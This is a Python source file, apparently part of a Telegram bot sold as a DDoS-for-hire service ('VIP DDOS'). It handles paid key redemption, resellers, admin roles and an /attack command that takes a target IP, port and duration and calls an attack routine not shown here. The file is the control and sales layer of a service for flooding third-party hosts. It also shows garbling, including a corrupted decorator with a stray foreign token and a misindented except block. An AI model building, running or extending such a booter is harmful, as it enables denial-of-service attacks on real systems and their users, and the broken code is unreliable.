            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["context"] != chat_type:
            response = f"This key is for {keys[key]['context'].capitalize()} use only. Use it in a {keys[key]['context']} chat."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["device_limit"] != float('inf') and len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            response = "App ne der kar di"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if user_id in keys[key]["devices"]:
            response = "You have already redeemed this key."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            response = "Invalid duration in key. Contact @Rahul_618"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": chat_type}
        keys[key]["devices"].append(user_id)
        save_data()
        response = f"Key redeemed successfully!\nContext: {chat_type.capitalize()}\nExpires on: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}, Context: {chat_type}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)
    else:
        response = "Invalid or expired key! Buy a new key for 50₹ and DM @Rahul_618."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
    save_data()

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    key_name = command_parts[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        response = "Invalid key format. Key must start with 'Rahul_sadiq-'"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            response = f"Key `{key_name}` is already blocked.\nBlocked by: @{blocker_username}\nBlocked on: {block_time}"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/block", f"Key: {key_name}", response)
            return
        blocker_username = username or f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        # Remove associated users
        affected_users = []
        for device_id in keys[key_name]["devices"]:
            if device_id in users:
                affected_users.append(device_id)
                del users[device_id]
        save_data()
        response = f"Key `{key_name}` has been blocked successfully.\nBlocked by: @{blocker_username}\nBlocked on: {block_time}"
        if affected_users:
            response += f"\nRemoved access for users: {', '.join(affected_users)}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}, Blocked by: @{blocker_username}, Blocked on: {block_time}, Affected Users: {affected_users}", response)
    else:
        response = f"Key `{key_name}` not found. Check keys.json or regenerate the key."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} failed. Available keys: {list(keys.keys())}\n")
    save_data()

@bot.message_handler探究
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /add <user_id>\nExample: /add 1807014348"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    target_user_id = command_parts[1]
    if target_user_id in authorized_users:
        response = f"User {target_user_id} is already authorized."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Target User ID: {target_user_id}", response)
        return
    expiration_time = add_time_to_current_date(months=1)
    authorized_users[target_user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": "both"}
    save_data()
    response = f"User {target_user_id} added with access until {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')} (both group and private)"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"Target User ID: {target_user_id}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_overlord(user_id, username):
        response = "Access Denied: Overlord only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", f"Command: {command}", response)
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
            response = "Logs sent successfully!"
        except FileNotFoundError:
            response = "No data found"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/logs", f"Command: {command}", response)
            return
    else:
        response = "No data found"
        safe_reply(bot, message, response)
    log_action(user_id, username, "/logs", f"Command: {command}", response)
    save_data()

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    has_active_access = False
    if is_admin(user_id, username):
        has_active_access = True
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except (ValueError, KeyError):
            has_active_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except (ValueError, KeyError):
            has_active_access = False
    response = (
        f"WELCOME TO VIP DDOS BHAI! 😎\n"
        f"Bot Name: Devil of DDoS Rahul\n"
        f"Owner: Sadiq\n"
        f"Created by: Sadiq\n"
        f"Use /help to see all commands\n"
        f"Join https://t.me/devil_ddos\n\n"
        f"{COMPULSORY_MESSAGE}\n"  # Added here for prominence
    )
    if not has_active_access:
        response += "Bhai, key lele @Rahul_618 se ya admin se authorize karwa le!"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)
    save_data()

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    has_access = False
    if is_admin(user_id, username):
        has_access = True
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date and user_info['context'] == chat_type:
                has_access = True
        except (ValueError, KeyError):
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except (ValueError, KeyError):
            has_access = False
    
    if not has_access:
        response = f"BSDK, access nahi hai! {chat_type.capitalize()} key le @Rahul_618 se ya admin se authorize karwa!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = "Usage: /attack <ip> <port> <time>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return
    target, port, time = command_parts[1], int(command_parts[2]), int(command_parts[3])
    if time > 240:
        response = "Error: Use less than 240 seconds"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    username = username or f"UserID_{user_id}"
    execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    save_data()

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /setcooldown <seconds>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return
    try:
        seconds = int(command_parts[1])
        if seconds < 0:
            response = "Cooldown must be non-negative"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
            return
        set_cooldown(seconds)
        response = f"Cooldown set to {seconds} seconds"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Seconds: {seconds}", response)
    except ValueError:
        response = "Invalid cooldown value. Please provide a number."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
    save_data()

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    response = f"Current cooldown period: {COOLDOWN_PERIOD} seconds"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)
    save_data()

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "No username"
    command = message.text
    my_key = "No key"
    role = "Guest"
    expiration = "No expiration"
    context = "None"
    if is_overlord(user_id, username):
        role = "Overlord"
    elif is_admin(user_id, username):
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                role = "Premium User"
                expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
                context = user_info['context'].capitalize()
                my_key = next((k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]), "No key")
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/myinfo", f"UserID: {user_id}", "Removed expired user access")
        except (ValueError, KeyError, StopIteration):
            expiration = "No expiration"
            role = "Guest"
    elif user_id in authorized_users:
        try:
            user_info = authorized_users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                role = "Authorized User"
                expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
                context = user_info['context'].capitalize()
            else:
                del authorized_users[user_id]
                save_data()
                log_action(user_id, username, "/myinfo", f"UserID: {user_id}", "Removed expired authorized user access")
        except (ValueError, KeyError):
            expiration = "No expiration"
            role = "Guest"
    response = (
        f"USER INFO BHAI! 😄\n"
        f"Username: @{username}\n"
        f"UserID: {user_id}\n"
        f"My key: `{my_key}`\n"
        f"Role: {role}\n"
        f"Context: {context}\n"
        f"Expiration: {expiration}\n"
    )
    if role == "Reseller":
        response += f"Balance: {balance} Rs\n"
    response += "Buy key from @Rahul_618\nAny problem contact @Rahul_618"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)
    save_data()

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", f"Command: {command}", response)
        return
    response = "Authorized Users\n"
    all_users = {**users, **authorized_users}
    if all_users:
        for user, info in all_users.items():
            expiration_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
            try:
                user_info = bot.get_chat(user)
                user_name = user_info.username if user_info.username else user_info.first_name
            except:
                user_name = "Unknown"
            context = info.get('context', 'both').capitalize()
            response += f"User ID: {user}\nUsername: @{user_name}\nContext: {context}\nExpires On: {formatted_expiration}\n"
    else:
        response = "No authorized users found."
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", "", response)
    save_data()

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /remove <user_id>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return
    target_user_id = command_parts[1]
    if target_user_id in users:
        del users[target_user_id]
        save_data()
        response = f"User {target_user_id} removed from key-based access."
    elif target_user_id in authorized_users:
        del authorized_users[target_user_id]
        save_data()
        response = f"User {target_user_id} removed from authorized access."
    else:
        response = f"User {target_user_id} not found in authorized users."
    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"Target User ID: {target_user_id}", response)

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    response = "Authorized Resellers\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            try:
                reseller_info = bot.get_chat(reseller_id)
                reseller_username = reseller_info.username if reseller_info.username else reseller_info.first_name
            except:
                reseller_username = "Unknown"
            response += f"Username: @{reseller_username}\nUserID: {reseller_id}\nBalance: {balance} Rs\n"
    else:
        response += "No reseller found"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", "", response)
    save_data()

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = "Usage: /addbalance <reseller_id> <amount>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            response = "Reseller ID not found"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
            return
        resellers[reseller_id] += amount
        save_data()
        response = f"Balance Successfully added\nBalance: {amount} Rs\nReseller ID: {reseller_id}\nNew balance: {resellers[reseller_id]} Rs"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}, New Balance: {resellers[reseller_id]}", response)
    except ValueError:
        response = "Invalid amount"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
    save_data()

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /removereseller <reseller_id>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        response = "Reseller ID not found."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)
        return
    del resellers[reseller_id]
    save_data()
    response = f"Reseller {reseller_id} has been removed successfully"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Bhai, ye admin ka kaam hai!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", f"Command: {command}", response)
        return
    response = "KEYS LIST BHAI! 🔑\n"
    if not keys:
        response = "No keys bhai!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", "", response)
        return

    for k, v in keys.items():
        # Calculate expiration time
        generated_time = datetime.datetime.strptime(v["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        minutes, hours, days, months = parse_duration(v["duration"])
        expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
        is_expired = datetime.datetime.now(IST) > expiration_time
        
        # Determine key status
        status = "Inactive"
        active_users = []
        if not v.get("blocked", False) and not is_expired:
            for device_id in v["devices"]:
                if device_id in users:
                    try:
                        user_expiration = datetime.datetime.strptime(users[device_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                        if datetime.datetime.now(IST) < user_expiration:
                            status = "Active"
                            try:
                                user_info = bot.get_chat(device_id)
                                user_name = user_info.username if user_info.username else user_info.first_name
                                active_users.append(f"@{user_name} (ID: {device_id})")
                            except:
                                active_users.append(f"Unknown (ID: {device_id})")
                    except (ValueError, KeyError):
                        continue

        # Prepare key details
        device_limit_display = "Unlimited" if v["device_limit"] == float('inf') else v["device_limit"]
        response += (
            f"Key: `{k}`\n"
            f"Gen by: @{v['generated_by']}\n"
            f"Gen on: {v['generated_time']}\n"
            f"Duration: {v['duration']}\n"
            f"Device Limit: {device_limit_display}\n"
            f"Context: {v['context'].capitalize()}\n"
            f"Devices Used: {len(v['devices'])}\n"
            f"Status: {status}\n"
        )
        if active_users:
            response += f"Active Users: {', '.join(active_users)}\n"
        if v.get("blocked", False):
            response += f"Blocked: Yes\nBlocked by: @{v['blocked_by_username']}\nBlocked on: {v['blocked_time']}\n"
        else:
            response += "Blocked: No\n"
        response += "\n"

    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", "", response)
    save_data()

# Background tasks
def periodic_tasks():
    while True:
        save_data()
        create_backup()
        time.sleep(600)  # 10 minutes

# Signal handler for instant save on exit
def signal_handler(signum, frame):
    print(f"Received signal {signum}, saving data before exit...")
    save_data()
    print("Data saved successfully. Exiting.")
    bot.stop_polling()
    exit(0)

# Set up signal handlers
signal.signal(signal.SIGINT, signal_handler)   # Handle Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Handle termination

# Start periodic tasks in a separate thread
def start_periodic_tasks():
    threading.Thread(target=periodic_tasks, daemon=True).start()

# Check network connectivity
def check_network_connectivity(host="8.8.8.8", port=53, timeout=3):
    """Check if the system has network connectivity by connecting to a host."""
    try:
        socket.setdefaulttimeout(timeout)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.close()
        return True
    except socket.error as e:
        log_error(f"Network check failed: {str(e)}", "SYSTEM", "SYSTEM")
        return False

# Main function to initialize and run the bot
def main():
    max_retries = 5
    retry_delay = 10  # Seconds to wait between retries

    try:
        # Load data on startup
        load_data()
        print("Bot initialized, data loaded.")

        # Start periodic tasks (e.g., saving data and creating backups)
        start_periodic_tasks()
        print("Periodic tasks started.")

        # Retry loop for starting the bot
        for attempt in range(1, max_retries + 1):
            try:
                # Check network connectivity before starting the bot
                if not check_network_connectivity():
                    print(f"Network unavailable, retrying in {retry_delay} seconds... (Attempt {attempt}/{max_retries})")
                    log_error(f"Network unavailable during startup, attempt {attempt}/{max_retries}", "SYSTEM", "SYSTEM")
                    time.sleep(retry_delay)
                    continue

                print("Starting bot polling...")
                bot.polling(none_stop=True, interval=0)
                break  # If polling starts successfully, exit the retry loop

                        except requests.exceptions.ConnectionError as e:
                print(f"Connection error: {str(e)}. Retrying in {retry_delay} seconds... (Attempt {attempt}/{max_retries})")
                log_error(f"Connection error during polling: {str(e)}, attempt {attempt}/{max_retries}", "SYSTEM", "SYSTEM")
                time.sleep(retry_delay)
            except Exception as e:
                print(f"Unexpected error: {str(e)}. Retrying in {retry_delay} seconds... (Attempt {attempt}/{max_retries})")
                log_error(f"Unexpected error during polling: {str(e)}, attempt {attempt}/{max_retries}", "SYSTEM", "SYSTEM")
                time.sleep(retry_delay)

        else:
            print(f"Max retries ({max_retries}) reached. Unable to start bot.")
            log_error(f"Max retries reached, bot failed to start after {max_retries} attempts", "SYSTEM", "SYSTEM")
            save_data()  # Save data before exiting
            exit(1)

    except Exception as e:
        print(f"Critical error during initialization: {str(e)}")
        log_error(f"Critical error during initialization: {str(e)}", "SYSTEM", "SYSTEM")
        save_data()  # Ensure data is saved on critical failure
        exit(1)

if __name__ == "__main__":
    main()